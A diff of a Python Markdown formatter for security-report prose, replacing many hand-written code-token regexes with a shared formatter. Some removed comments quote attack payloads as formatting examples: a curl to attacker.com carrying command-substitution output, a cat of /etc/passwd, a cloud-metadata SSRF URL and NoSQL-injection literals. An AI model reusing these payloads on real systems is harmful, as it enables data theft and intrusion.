@@ -52,13 +52,14 @@ What this script does NOT do:
     is the only place the touch-up sticks.
 
 Excluded contexts (mirrors qa_checks.py):
-  - Fenced code blocks (```…```)
+  - Backtick or tilde fenced code blocks
   - Headings (`#`/`##`/… lines)
-  - Table rows (lines starting with `|`)
   - Existing backticked spans
   - Markdown-link URLs `[label](path)`
   - HTML attributes (`href="…"`, `src="…"`)
-  - Tokens containing `*` or `**` (glob wildcards from YAML-derived prose)
+  - Raw `<details>`, `<pre>`, and `<code>` blocks
+
+Tables and blockquote prose are included so the same token is formatted in every visible report section. Globs are code under prose-style Rule 6.
 
 Whole-document post-processors still touch narrowly scoped table rows for
 canonical threat-title fallback normalization.
@@ -76,371 +77,20 @@ import html
 import re
 import sys
 from pathlib import Path
+from typing import Iterable
 
 import yaml
 from _atomic_io import atomic_write_text
 from _slug import github_render_slug
+from inline_code_formatter import (
+    MarkdownScanState,
+)
+from inline_code_formatter import (
+    format_inline_code as _format_inline_code_canonical,
+)
 from perimeter_patterns import strip_perimeter_absence_sentences
 
 PLUGIN_ROOT = Path(__file__).resolve().parent.parent
-
-_EXTENSIONS = (
-    "ts",
-    "tsx",
-    "js",
-    "jsx",
-    "json",
-    "yaml",
-    "yml",
-    "py",
-    "go",
-    "rs",
-    "java",
-    "kt",
-    "rb",
-    "php",
-    "cs",
-    "c",
-    "h",
-    "cpp",
-    "hpp",
-    "swift",
-    "scala",
-    "md",
-    "html",
-    "css",
-    "scss",
-    "sql",
-    "sh",
-    "bash",
-    "ps1",
-    "toml",
-    "lock",
-    "env",
-    # Common backup / build artefacts (2026-05): the LLM-authored prose
-    # frequently mentions `package.json.bak`, `acquisitions.md`,
-    # `incident-support.kdbx` etc. as bare tokens — wrap them too.
-    "bak",
-    "kdbx",
-    "pem",
-    "crt",
-    "p12",
-    "key",
-    "pub",
-)
-_PATH_RE = re.compile(
-    # The leading `\.?` admits dot-directory roots — `.github/workflows/ci.yml`,
-    # `.circleci/config.yml`, `.claude/settings.json`. Without it the match
-    # started one char late (at `github`), and the adjacency guard below
-    # (`before in "._"`) then correctly discarded it rather than emit a
-    # half-wrapped ``.`github/...` `` — so the path stayed bare in EVERY
-    # context and the QA reference-format gate flagged it as a non-actionable
-    # `manual_review` the repair loop structurally cannot clear (juice-shop
-    # 2026-07-27, F-010 `.github/workflows/image_actions.yml:33`).
-    # Greedy `[\w.-]*` still claims the whole token when the dot is interior
-    # (`v1.github/x.yml` matches from `v`), so this only fires on a real
-    # dot-root.
-    r"(?P<path>\.?[A-Za-z][\w.-]*/[\w./-]+\.(?:"
-    + "|".join(_EXTENSIONS)
-    # `(?:-\d+)?` keeps a `:line-line` range inside the wrapped span; without it
-    # the boundary below closes the backtick after `:20`, leaving `-25` bare.
-    + r")(?::\d+(?:-\d+)?)?)"
-    # Trailing boundary (mirrors _BARE_FILENAME_RE): without it the extension
-    # alternation stops at a PREFIX extension — `.h` is tried before `.html`
-    # and matches `administration.component.h`, leaving a bare `tml`. The
-    # `(?![\w/`])` lookahead forces backtracking to the longest extension that
-    # ends at a real token boundary, so `.html` / `.ts` match in full.
-    + r"(?![\w/`])"
-)
-# 2026-05 R-7 — additional code-token classes the LLM frequently leaves
-# bare in prose. Each pattern fires INDEPENDENTLY of `_PATH_RE`; all
-# share the same forbidden-zone mask (existing backticks, link URLs,
-# HTML attrs).
-#   - URL paths starting with `/`: `/rest/user/login`, `/etc/passwd`.
-#     Conservative: requires ≥ 2 path segments AND the first segment must
-#     start with a letter so accidental matches like " /etc."  or " /."
-#     are excluded.  Trailing punctuation (`.`, `,`, `;`, `)`, `?`) is left
-#     OUTSIDE the backticked span via a negative-character-class boundary.
-_URL_PATH_RE = re.compile(
-    # Lookbehind also rejects `<` so long HTML closing tags `</thead>`,
-    # `</tbody>`, `</table>` are not mis-matched as `/thead`/`/tbody`/`/table`
-    # URL paths and wrapped in backticks. The Top Findings table emitted
-    # these tags structurally; the wrapper produced `<`/thead`>` etc. and
-    # broke contract validation. Adding `<` to the negative class closes
-    # this without affecting any legitimate `/path` match (prose URL paths
-    # are never adjacent to `<`).
-    r"(?<![\w`/<])"
-    # First segment requires ≥ 3 chars after `/` so accidental tokens like
-    # `and/or` (`/or` would be only 2 chars) are rejected. Additional
-    # segments are optional so `/ftp` and `/etc/passwd` both match.
-    r"(?P<urlpath>/[A-Za-z][\w-]{2,}(?:/[\w%:&=.-]+)*)"
-    # Allow `.`, `,`, `;`, `)`, `?`, `!` as next character — those are
-    # sentence punctuation that the trailing-punct stripper takes care of.
-    # Symmetric tightening: also reject `>` so the closing-bracket end of
-    # an HTML tag boundary is rejected, mirroring the lookbehind.
-    r"(?![\w/`>])"
-)
-#   - Bare standalone source-filename tokens (no preceding path):
-#     `login.ts`, `search.ts:23`, `package.json.bak`, `app.guard.ts:54`.
-#     Excludes tokens that already contain a slash (handled by `_PATH_RE`)
-#     and excludes domain-like tokens (`owasp.org`, `juice.shop`, `Node.js`)
-#     by requiring the extension to be one of our recognised source
-#     extensions (a TLD allowlist would be brittle — the extension list IS
-#     the allowlist).
-_BARE_FILENAME_RE = re.compile(
-    # `-` is in the negative lookbehind so a hyphen-joined path component is
-    # not re-matched mid-token: in `frontend/.../last-login-ip.component.ts`
-    # the bare pattern must NOT start at `login-ip.component.ts` (preceded by
-    # `-`), otherwise it wraps the tail before _PATH_RE can wrap the whole
-    # path and the leading `last-` is left dangling outside the code span.
-    r"(?<![\w./`-])"
-    # Allow multi-dot filenames like `package.json.bak`. The
-    # ``(?:\.[A-Za-z0-9-]+)*`` allows zero or more middle dot-segments
-    # before the final recognised extension (was ``?`` which capped at
-    # one middle segment).
-    r"(?P<file>[A-Za-z][\w-]+(?:\.[A-Za-z0-9-]+)*\.(?:" + "|".join(_EXTENSIONS) + r")(?::\d+(?:-\d+)?)?)"
-    # Trailing punctuation (period, comma, semicolon, `)`) is allowed —
-    # the trailing-punct stripper handles them.
-    r"(?![\w/`])"
-)
-# 2026-05 — well-known product names that match _BARE_FILENAME_RE but are
-# NOT files. Excluded from wrapping so `Node.js` reads as a product name
-# in prose ("crashes the Node.js process") instead of as a file token.
-# Keep this list narrow — adding a name suppresses wrapping for every
-# context, including legitimate file references.
-_BARE_FILENAME_ALLOWLIST: frozenset[str] = frozenset(
-    {
-        "Node.js",
-        "node.js",
-        "Vue.js",
-        "vue.js",
-        "Next.js",
-        "next.js",
-        "Nuxt.js",
-        "nuxt.js",
-        "Express.js",
-        "express.js",
-        "Backbone.js",
-        "backbone.js",
-        "Ember.js",
-        "ember.js",
-        "Three.js",
-        "three.js",
-    }
-)
-#   - Angle-bracket operand placeholders: `<non-root-uid>`, `<digest>`,
-#     `<token>`. These are NOT HTML, but Markdown emits them as raw HTML and
-#     the browser then drops the unknown element, so the reader sees the
-#     instruction with its operand missing — "Add USER " (juice-shop
-#     2026-08-27, M-049; 9 occurrences across 4 placeholders). Wrapping makes
-#     the literal text render. Real HTML the composer emits (tables, `<br>`,
-#     emphasis) is excluded BY NAME below rather than by shape, because a
-#     placeholder and an element are indistinguishable as tokens.
-_HTML_ELEMENTS: frozenset[str] = frozenset(
-    "a abbr b blockquote br code col colgroup dd details div dl dt em h1 h2 h3 "
-    "h4 h5 h6 hr i img li ol p pre q s small span strong sub summary sup table "
-    "tbody td tfoot th thead tr u ul".split()
-)
-_ANGLE_PLACEHOLDER_RE = re.compile(r"(?<![\w`<])(?P<ph><[a-z][a-z0-9_-]*>)(?![\w`])")
-#   - Extensionless well-known filenames: `Dockerfile`, `Makefile`. Both
-#     `_PATH_RE` and `_BARE_FILENAME_RE` require a dot-extension, so these are
-#     invisible to every existing pass. Wrap ONLY when a directory prefix or a
-#     `:line` suffix makes the token unambiguously a file reference: bare
-#     "Dockerfile" reads as a common noun in prose ("the Dockerfile does not
-#     set USER", 14 of 17 occurrences on juice-shop 2026-08-27) and wrapping
-#     that would be wrong.
-_EXTENSIONLESS_NAMES = (
-    "Dockerfile|Containerfile|Makefile|Jenkinsfile|Gemfile|Procfile|Rakefile|Vagrantfile|Brewfile"
-)
-_EXTENSIONLESS_FILE_RE = re.compile(
-    r"(?<![\w`/.-])"
-    r"(?P<xfile>"
-    r"(?:[\w.-]+/)+(?:" + _EXTENSIONLESS_NAMES + r")(?::\d+(?:-\d+)?)?"
-    r"|(?:" + _EXTENSIONLESS_NAMES + r"):\d+(?:-\d+)?"
-    r")"
-    r"(?![\w/`])"
-)
-#   - Function-call tokens: `eval()`, `bypassSecurityTrustHtml()`,
-#     `helmet.noSniff()`, `models.sequelize.query()`. Conservative:
-#     requires the parens AND a leading letter so generic prose ("the
-#     resulting (broken) check") doesn't false-positive.
-_FUNCTION_CALL_RE = re.compile(
-    r"(?<![\w`])"
-    r"(?P<fn>[A-Za-z_][\w]*(?:\.[A-Za-z_][\w]*)*\(\s*\))"
-    r"(?![\w`])"
-)
-#   - JWT / HTTP literal allowlist: `alg:none`, `alg:HS256`, `alg:RS256`,
-#     `role:admin`, `role:user`, `role:guest`. Narrow allowlist to avoid
-#     accidentally matching generic prose like "the time is now:".
-_LITERAL_TOKEN_RE = re.compile(
-    r"(?<![\w`])"
-    r"(?P<lit>(?:alg:(?:none|HS256|HS384|HS512|RS256|RS384|RS512|ES256|ES384|ES512|PS256|none)"
-    r"|role:(?:admin|user|guest|root|anonymous|deluxe)"
-    r"|noent:(?:true|false)"
-    r"|multi:(?:true|false)"
-    r"|method:(?:GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)))"
-    r"(?![\w`])"
-)
-#   - Package@version tokens: `express-jwt@0.1.3`, `jsonwebtoken@0.4.0`,
-#     `@angular/core@15.2.0`. The `@<digit>` boundary requires the version to
-#     start with a digit, so email addresses (`user@example.com` → letter
-#     after `@`) and decorators (`@Component`) never match. The optional
-#     `@scope/` prefix admits npm-scoped packages.
-_LIB_VERSION_RE = re.compile(
-    r"(?<![\w`/@])"
-    r"(?P<libver>(?:@[a-z0-9][\w.-]*/)?[a-z][\w.-]*@\d[\w.\-+]*)"
-    r"(?![\w`])"
-)
-#   - CVE identifiers: `CVE-2020-28042`. Distinctive shape, very low
-#     false-positive risk. CVEs inside a markdown link label
-#     (`[CVE-2020-28042](https://…)`) are protected by _MD_LINK_LABEL_RE.
-_CVE_RE = re.compile(r"(?<![\w`-])(?P<cve>CVE-\d{4}-\d{4,7})(?![\w`])")
-#   - Bare JWT/JWS algorithm names: `HS256`, `RS256`, `ES384`, `PS512`.
-#     The `:` in the negative lookbehind keeps the `HS256` inside `alg:HS256`
-#     out of this pass (that whole literal is owned by _LITERAL_TOKEN_RE);
-#     this pass only catches the algorithm used bare in prose
-#     ("switch to HS256"). Bare `none` is intentionally NOT matched here.
-_ALG_NAME_RE = re.compile(r"(?<![\w`:])(?P<alg>(?:HS|RS|ES|PS)(?:256|384|512))(?![\w`])")
-#   - Bare hash / digest algorithm names used in prose ("unsalted MD5",
-#     "SHA-1 hashing"). These read as code identifiers, not English words,
-#     so they get backticked like any other code token. Restricted to the
-#     named MD/SHA digests so arbitrary capitalised words are never matched.
-_HASH_NAME_RE = re.compile(r"(?<![\w`:/-])(?P<hash>MD[45]|SHA-?(?:1|224|256|384|512))(?![\w`])")
-#   - HTTP method + URL path pairs: backtick the path portion of
-#     `GET /support/logs` → `GET \`/support/logs\``.  The method stays
-#     bare so the sentence reads naturally; only the route gets the code
-#     span.
-_HTTP_METHOD_PATH_RE = re.compile(
-    r"\b(?P<method>GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+"
-    r"(?P<route>/[A-Za-z][\w/.:%-]+)"
-    r"(?![\w/`])"
-)
-#   - Dotted runtime-API tokens used BARE in prose, no parens: `vm.runInContext`,
-#     `req.body`, `process.env`, `child_process.exec`, `JSON.parse`. These read
-#     as code, not English, in §5 Notes / §8 descriptions / §3 Attack Steps.
-#     Anchored to a known-object allowlist so generic dotted prose ("the U.S.
-#     team", "Node.js") never matches; the trailing `(`-exclusion leaves the
-#     `foo()` forms to `_FUNCTION_CALL_RE`. Plus a couple of standalone sandbox
-#     sink identifiers (`notevil`, `vm2`) that are unambiguously code names.
-_CODE_API_RE = re.compile(
-    r"(?<![\w`.$@-])"
-    r"(?P<api>"
-    r"(?:vm|req|res|process|child_process|JSON|Object|crypto|fs|sequelize)"
-    r"\.[A-Za-z_]\w*(?:\.[A-Za-z_]\w*)*"
-    r"|notevil|vm2"
-    r")"
-    r"(?![\w`])"
-)
-#   - NoSQL / MongoDB-operator object literals used bare in prose:
-#     `{id: {$gt:''}, message: 'hacked'}`, `{$where: '...'}`, `{$ne: null}`.
-#     Matches a `{…}` span (≤1 level of nesting, single line) that CONTAINS a
-#     known query operator. The operator may already carry the composer's
-#     `\$`-escape (`_escape_dollar_operators` runs before this pass); the
-#     content guard in `_wrap_line` accepts both `$op` and `\$op`, and unescapes
-#     `\$`→`$` before wrapping so the code span renders the operator cleanly
-#     (inside a backtick span the `$` is literal — no math-mode risk remains).
-_NOSQL_OBJECT_RE = re.compile(
-    r"(?<![\w`])"
-    r"(?P<obj>\{(?:[^{}\n]|\{[^{}\n]*\})*\})"
-    r"(?![\w`])"
-)
-# Detects a Mongo/NoSQL operator inside a candidate object — gates the
-# _NOSQL_OBJECT_RE pass so plain `{a, b}` prose sets are never backticked.
-_NOSQL_OPERATOR_RE = re.compile(
-    r"\\?\$(?:gt|gte|lt|lte|ne|eq|in|nin|where|regex|exists|or|and|not|elemMatch|set|push|all)\b"
-)
-# 2026-07-19 — token classes the report still shipped BARE (user report on the
-# insecure-python-app run). Each is a demonstrated inconsistency, not a
-# hypothetical: the SAME token was backticked in one section and bare in another.
-#
-#   - Absolute URLs, including bare-IP hosts. The SSRF finding narrates
-#     `http://169.254.169.254/latest/meta-data/` as the attacker payload; §7
-#     backticked it, the §8 register cell shipped it bare. Runs BEFORE
-#     `_URL_PATH_RE`, which would otherwise claim only the `/latest/meta-data/`
-#     tail and leave the scheme+host stranded outside the span.
-#     Parens are excluded from the charset in BOTH directions: a URL embedded
-#     in a code payload (`'curl http://attacker.com/$(id)'`) would otherwise
-#     match up to the `)` and swallow an unbalanced `(`, emitting nested
-#     backticks that corrupt the surrounding span.
-_URL_RE = re.compile(
-    r"(?<![\w`/])"
-    r"(?P<url>(?:https?|ftp|file|ws|wss)://[^\s`<>\"'()\[\]]+)"
-    r"(?![\w`])"
-)
-#   - Bare IPv4 literals / host:port / CIDR used without a scheme
-#     (`169.254.169.254`, `127.0.0.1:8000`, `0.0.0.0`, `10.0.0.0/8`). Every
-#     octet is range-checked IN the pattern and all four are required, so
-#     dotted version strings (`1.2.3` — three parts) are structurally
-#     unmatchable. IPs inside a URL are already masked by the `url` pass.
-_IPV4_OCTET = r"(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)"
-_IP_RE = re.compile(
-    r"(?<![\w`.:/-])"
-    r"(?P<ip>" + _IPV4_OCTET + r"(?:\." + _IPV4_OCTET + r"){3}(?::\d{1,5})?(?:/\d{1,2})?)"
-    # A sentence-final period must not reject the match — a blanket `.`
-    # exclusion made the engine backtrack off the `:port` to find a legal
-    # boundary and shipped `` `127.0.0.1`:8000 ``. Only a period that
-    # CONTINUES the address (a fifth octet) disqualifies it.
-    r"(?![\w`])(?!\.\d)"
-)
-#   - JSON object literals used bare in prose as the attacker's payload:
-#     `{"is_staff": true}`, `{"alg":"HS256"}`, `{"role":"ADMIN","admin":1}`.
-#     These share the `{…}` matcher and the whole wrap machinery with the
-#     NoSQL pass — only the CONTENT GATE differs (a quoted key instead of a
-#     Mongo operator), so one `obj` pass serves both.
-_JSON_KEY_RE = re.compile(r'"[\w.$-]+"\s*:')
-#   - snake_case identifiers used bare in prose (`verify_signed_jwt`,
-#     `read_unsigned_jwt_claims`, `require_signed_jwt`). An underscore-joined
-#     lowercase token has no English reading, so requiring an underscore makes
-#     ordinary prose structurally unmatchable — no allowlist needed. These
-#     shipped bare *in the same sentence as* a correctly backticked
-#     `auth.py:84`, which is exactly the inconsistency the user flagged.
-#     The trailing exclusion rejects `.`, `(` and `/` so a token that is really
-#     the head of a longer expression (`crypto_services.py:14`,
-#     `update_user(payload)`) is left to the file / call passes instead of
-#     being half-wrapped — the very defect `_merge_split_code_spans` repairs.
-#     A sentence-final period is fine (`… and legacy_authenticate_raw.`) — only
-#     a period that CONTINUES the token (`crypto_services.py`) disqualifies it,
-#     hence the `(?!\.\w)` rather than a blanket `.` exclusion.
-#     An optional dotted module prefix is admitted (`hmac.compare_digest`,
-#     `subprocess.check_output`, `db.find_user_by_id`) — the underscore in the
-#     member still carries the whole guarantee, and without the prefix the pass
-#     would wrap only the member and strand the module outside the span.
-_SNAKE_IDENT_RE = re.compile(
-    r"(?<![\w`./$-])"
-    r"(?P<snake>(?:[a-z][a-z0-9]*\.)?[a-z][a-z0-9]*(?:_[a-z0-9]+)+)"
-    r"(?![\w`/(])(?!\.\w)"
-)
-#   - SCREAMING_SNAKE constants and dunders used bare in prose:
-#     `JWT_SIGNING_KEY`, `DB_PASSWORD`, `APP_REGION`, `__builtins__`,
-#     `__reduce__`. Same guarantee as the lowercase form — an underscore-joined
-#     all-caps token is never English — and these are exactly the tokens a
-#     secrets/config finding narrates, so they appeared bare in §3 and §8 while
-#     the surrounding `auth.py:18` was correctly formatted.
-_CONST_IDENT_RE = re.compile(
-    r"(?<![\w`./$-])"
-    r"(?P<const>__\w+__|[A-Z][A-Z0-9]*(?:_[A-Z0-9]+)+)"
-    r"(?![\w`/(])(?!\.\w)"
-)
-#   - A dangling quoted subscript left in prose after the head of an
-#     enumeration was merged: ``request.data['role'] / ['is_staff']``. The
-#     quoted key makes this unambiguous — a Markdown link label `[text](url)`
-#     carries no quotes and is masked anyway.
-_BARE_SUBSCRIPT_RE = re.compile(r"(?<![\w`\]])(?P<sub>\[['\"][\w.$-]+['\"]\])(?![\w`])")
-#   - A whole call expression WITH arguments used bare in prose:
-#     `update_user_mass_assignment(current_user_id, request.json)`,
-#     `crypto.recover_password(item['secret'])`. `_FUNCTION_CALL_RE` only
-#     covers the empty-arg form `foo()`. Without this the narrower identifier
-#     passes below (`api`, `snake`) each grab a token from INSIDE the argument
-#     list and emit exactly the half-formatted result this whole section exists
-#     to prevent — `update_user_mass_assignment(\`current_user_id\`,
-#     \`request.json\`)`. Wrapping the expression as one span makes it a
-#     forbidden zone for all of them. Gated by `_looks_like_call_args` so a
-#     prose aside (`the check (a legacy path)`) is never swallowed.
-_CALL_WITH_ARGS_RE = re.compile(
-    r"(?<![\w`.])"
-    r"(?P<call>[A-Za-z_]\w*(?:\.[A-Za-z_]\w*)*\([^()\n]{1,80}\))"
-    r"(?![\w`])"
-)
 
 # --- Split code-span repair -------------------------------------------------
 # The LLM routinely backticks only the HEAD of a code token and leaves the
@@ -512,29 +162,6 @@ def _looks_like_call_args(tail: str) -> bool:
     return bool(re.fullmatch(r"[\w'\"`.,:=\[\]{}*/+\s-]+", inner))
 
 
-def _inside_bare_call(line: str, pos: int) -> bool:
-    """True when *pos* sits inside the argument list of an un-backticked call.
-
-    Scans left for an unmatched ``(``; the call is "bare" when that paren abuts
-    an identifier character (``foo(``, not ``… (``) and the identifier is not
-    itself already inside a code span.
-    """
-    depth = 0
-    for i in range(pos - 1, -1, -1):
-        c = line[i]
-        if c == ")":
-            depth += 1
-        elif c == "(":
-            if depth:
-                depth -= 1
-                continue
-            prev = line[i - 1] if i else " "
-            return bool(prev.isalnum() or prev == "_")
-        elif c == "`":
-            return False
-    return False
-
-
 def _merge_split_code_spans(line: str) -> tuple[str, int]:
     """Pull un-backticked continuations back into the code span they belong to."""
     # Ambiguous-pairing guard. Every pattern here assumes the backticks on the
@@ -567,32 +194,6 @@ def _merge_split_code_spans(line: str) -> tuple[str, int]:
 
 
 _BACKTICK_SPAN_RE = re.compile(r"`[^`\n]+`")
-_MD_LINK_URL_RE = re.compile(r"\]\(([^)]+)\)")
-_HTML_ATTR_RE = re.compile(r'(?:href|src|action|formaction)="[^"]+"')
-# 2026-05 — additional forbidden zones for the §8 Findings Register cells.
-# `<details>...</details>` blocks contain a `<pre><code>` snippet that
-# must NEVER be rewritten; `<pre>...</pre>` and `<code>...</code>`
-# (without surrounding details) likewise hold raw source code. We skip the
-# entire span so the inner regex engines never see the embedded tokens.
-_HTML_DETAILS_RE = re.compile(r"<details\b.*?</details>", re.DOTALL)
-_HTML_PRE_RE = re.compile(r"<pre\b.*?</pre>", re.DOTALL)
-_HTML_CODE_INLINE_RE = re.compile(r"<code\b.*?</code>", re.DOTALL)
-# Markdown link LABEL — `[label](url)` — keep the bracketed text raw so
-# multi-word link labels like `[CWE-321](https://…)` aren't broken by
-# accidental backtick injection inside the label.
-_MD_LINK_LABEL_RE = re.compile(r"\[[^\]]+\]\([^)]+\)")
-# Linked-title TAIL — the `— <title>` that trails a finding / threat /
-# mitigation anchor link, e.g. `[F-002](#f-002) — MD5 hashing`. Per the
-# title-exemption rule ("code in titles and links is NOT backticked"), the
-# title tail is a title context: code tokens in it (function calls, paths,
-# hash names) must stay bare. Requiring the em-dash immediately after the
-# link scopes this to title tails only — genuine prose that merely follows
-# a link ("see [F-001](#f-001) which calls eval()") is NOT protected. The
-# tail runs up to the next `<br/>`, table-cell `|`, or end of line.
-# The separator may be an em-dash, en-dash, or a spaced hyphen — the
-# `_bulletize_relevant_findings` post-processor normalises `- ` to `— `
-# only AFTER the per-line wrap pass, so the hyphen form must match here too.
-_LINKED_TITLE_TAIL_RE = re.compile(r"\]\(#(?:f|t|m|th)-\d+\)\s*[—–-]\s[^\n|]*?(?=<br/?>|\||$)")
 
 
 def _html_block_body_wrappable(stripped: str) -> bool:
@@ -654,7 +255,7 @@ def _backticks_to_code(text: str) -> tuple[str, int]:
     return _BACKTICK_SPAN_RE.sub(_sub, text), n
 
 
-def _wrap_line(line: str) -> tuple[str, int]:
+def _wrap_line(line: str, known_tokens: Iterable[str] = ()) -> tuple[str, int]:
     """Return (rewritten_line, n_changes).
 
     Multi-pass wrapper — applies each of the registered code-token regexes
@@ -667,232 +268,23 @@ def _wrap_line(line: str) -> tuple[str, int]:
     # token fragment (2026-07-19).
     line, n_total = _merge_split_code_spans(line)
 
-    # Order matters: absolute URLs run FIRST — they are the longest token and
-    # would otherwise be carved up by `_URL_PATH_RE` (path tail) and `_IP_RE`
-    # (host). HTTP-method-path runs next because its match consumes both the
-    # method and the path; otherwise `_URL_PATH_RE` would backtick the path
-    # while leaving the method bare on the outside. Then path tokens, then bare
-    # filenames, then function calls, then literal allowlist. _PATH_RE late so
-    # it doesn't shadow more-specific patterns (it only matches
-    # `<word>/<file>.<ext>` shapes anyway). The bare-identifier passes
-    # (`snake`, `sub`) run LAST of all: every longer construct that merely
-    # CONTAINS an identifier — a path, a filename, a call — must already own its
-    # span, or the identifier pass would half-wrap it.
-    pass_order: list[tuple[re.Pattern[str], str]] = [
-        (_URL_RE, "url"),
-        (_HTTP_METHOD_PATH_RE, "_http_method_path"),
-        # NoSQL operator objects run early so the whole `{…}` span is wrapped
-        # before the inner tokens are exposed to later single-token passes.
-        (_NOSQL_OBJECT_RE, "obj"),
-        (_CALL_WITH_ARGS_RE, "call"),
-        (_LIB_VERSION_RE, "libver"),
-        (_URL_PATH_RE, "urlpath"),
-        (_EXTENSIONLESS_FILE_RE, "xfile"),
-        (_BARE_FILENAME_RE, "file"),
-        (_ANGLE_PLACEHOLDER_RE, "ph"),
-        (_FUNCTION_CALL_RE, "fn"),
-        (_LITERAL_TOKEN_RE, "lit"),
-        (_ALG_NAME_RE, "alg"),
-        (_HASH_NAME_RE, "hash"),
-        (_CVE_RE, "cve"),
-        (_CODE_API_RE, "api"),
-        (_PATH_RE, "path"),
-        (_IP_RE, "ip"),
-        (_SNAKE_IDENT_RE, "snake"),
-        (_CONST_IDENT_RE, "const"),
-        (_BARE_SUBSCRIPT_RE, "sub"),
-    ]
+    # The canonical syntax-aware recognizer claims complete balanced
+    # expressions. All renderer, walkthrough, autofix, and QA entry points use
+    # this same candidate set; there is no second token-pattern pass here.
+    line, n_canonical = _format_inline_code_canonical(line, known_tokens)
+    n_total += n_canonical
 
-    for pat, group_or_special in pass_order:
-        forbidden: list[tuple[int, int]] = []
-        for span_re in (
-            _BACKTICK_SPAN_RE,
-            _MD_LINK_URL_RE,
-            _MD_LINK_LABEL_RE,
-            _LINKED_TITLE_TAIL_RE,
-            _HTML_ATTR_RE,
-            _HTML_DETAILS_RE,
-            _HTML_PRE_RE,
-            _HTML_CODE_INLINE_RE,
-        ):
-            # The linked-title TAIL exemption (`](#m-036) — …title…`) keeps
-            # weakness nouns / hash names / library names bare in title
-            # contexts. But a file PATH (directory separator + filename,
-            # optionally `:line`) is unambiguously code and SHOULD be
-            # backticked even when it trails a mitigation/finding link — the
-            # §2 Fix cell, §8 story-card titles, and §9 register all rendered
-            # `routes/fileUpload.ts:83`-style tails unformatted (user report
-            # 2026-06-12). So the two path-shaped passes are allowed to reach
-            # into the title tail; every other pass still respects it, and the
-            # link itself stays protected by _MD_LINK_LABEL_RE/_MD_LINK_URL_RE.
-            if span_re is _LINKED_TITLE_TAIL_RE and group_or_special in (
-                "path",
-                "urlpath",
-                # Bare filenames ending in a known code extension
-                # (`last-login-ip.component.html:10`, `b2bOrder.ts`) and
-                # function calls (`next()`) are as unambiguously code as a
-                # slash-path and were left bare in finding/mitigation title
-                # tails — §4 Linked-Threats, §8 Fix-cell (user report
-                # 2026-06-12). They penetrate the title-tail mask too; weakness
-                # nouns / hash names / library names still stay bare (their
-                # passes do NOT appear here), and the link itself stays
-                # protected by _MD_LINK_LABEL_RE / _MD_LINK_URL_RE.
-                "file",
-                "fn",
-            ):
-                continue
-            for m in span_re.finditer(line):
-                forbidden.append((m.start(), m.end()))
-        forbidden.sort()
-
-        def overlaps_forbidden(s: int, e: int) -> bool:
-            for fs, fe in forbidden:
-                if s < fe and e > fs:
-                    return True
-            return False
-
-        matches = list(pat.finditer(line))
-        if not matches:
-            continue
-
-        # Special case: HTTP method + path — backtick only the path
-        # portion, leave the method as bare uppercase text.
-        if group_or_special == "_http_method_path":
-            out: list[str] = []
-            last = 0
-            n_changes = 0
-            for m in matches:
-                # Span of the ROUTE (not the whole match).
-                rs, re_ = m.start("route"), m.end("route")
-                tok = m.group("route")
-                if "*" in tok:
-                    continue
-                if overlaps_forbidden(rs, re_):
-                    continue
-                # Strip trailing punctuation that should sit OUTSIDE the
-                # backtick span (`.`, `,`, `;`, `)`, `?`).
-                trailing = ""
-                while tok.endswith((".", ",", ";", ")", "?", "!")):
-                    trailing = tok[-1] + trailing
-                    tok = tok[:-1]
-                    re_ -= 1
-                if not tok:
-                    continue
-                out.append(line[last:rs])
-                out.append(f"`{tok}`" + trailing)
-                last = re_ + len(trailing)
-                n_changes += 1
-            out.append(line[last:])
-            line = "".join(out)
-            n_total += n_changes
-            continue
-
-        out2: list[str] = []
-        last = 0
-        n_changes = 0
-        for m in matches:
-            s, e = m.start(), m.end()
-            tok = m.group(group_or_special)
-            # NoSQL object pass: only wrap a `{…}` span that actually carries a
-            # query operator (so plain prose sets like `{read, write}` are
-            # left alone), and unescape the composer's `\$`→`$` so the code
-            # span renders the operator cleanly.
-            if group_or_special == "obj":
-                # Content gate — a `{…}` span is only code when it carries a
-                # Mongo/NoSQL operator OR a quoted JSON key. Plain prose sets
-                # (`{read, write}`) and template placeholders (`{username}`)
-                # match neither and stay bare. The JSON arm (2026-07-19) covers
-                # the attacker-payload literals the walkthroughs narrate:
-                # `{"is_staff": true}`, `{"alg":"HS256"}`.
-                if not (_NOSQL_OPERATOR_RE.search(tok) or _JSON_KEY_RE.search(tok)):
-                    continue
-                tok = tok.replace("\\$", "$")
-            # Call-expression pass: only wrap when the parens read as ARGUMENTS.
-            if group_or_special == "call" and not _looks_like_call_args(tok[tok.index("(") :]):
-                continue
-            # Globs and wildcards never get backticked — they may be
-            # YAML-derived prose like `routes/**`.
-            if "*" in tok:
-                continue
-            # Well-known product names (Node.js, Vue.js, …) match the
-            # bare-filename regex but are NOT files. Skip them so they
-            # read as product names in prose.
-            if group_or_special == "file" and tok in _BARE_FILENAME_ALLOWLIST:
-                continue
-            # A real HTML element the composer emitted — leave it as markup.
-            if group_or_special == "ph" and tok.strip("<>") in _HTML_ELEMENTS:
-                continue
-            if overlaps_forbidden(s, e):
-                continue
-            # Adjacency guard (2026-06-02): never backtick a token that sits
-            # INSIDE a larger un-backticked code expression — wrapping just the
-            # inner token produces broken partial formatting like
-            #   btoa(profile.email.split('').`reverse()`.join(''))
-            # or  algorithm: '`RS256`'  or  execSync('cat `/etc/passwd`').
-            # Signals that the match is mid-expression:
-            #   • preceded by `.` / `_`  → member-access or identifier fragment
-            #   • wrapped in quotes      → it is a string-literal fragment
-            #   • a dotted chain immediately followed by `(`  → method call
-            #     embedded in a bigger expression
-            #   • followed by `.<word>`  → the member chain continues
-            # Standalone tokens in real prose (space / paren-in-prose
-            # boundaries) are unaffected and still get backticked.
-            gs, ge = m.start(group_or_special), m.end(group_or_special)
-            before = line[gs - 1] if gs > 0 else " "
-            after = line[ge] if ge < len(line) else " "
-            if before in "._":
-                continue
-            # Enclosing-expression guard (2026-07-19). The single-char checks
-            # below only see the immediate neighbours, so a token sitting in the
-            # ARGUMENT LIST of a call that no pass managed to wrap as a whole
-            # still got backticked on its own — `foo(\`current_user_id\`)`. If
-            # the match is inside an unclosed `(` whose opening paren abuts an
-            # identifier, it is part of a larger code expression: leave it bare
-            # rather than half-format it. Bare beats half-wrapped.
-            if _inside_bare_call(line, gs):
-                continue
-            if before in "'\"" and after in "'\"":
-                continue
-            if after == "(" and "." in tok:
-                continue
-            if after == "." and ge + 1 < len(line) and (line[ge + 1].isalnum() or line[ge + 1] == "_"):
-                continue
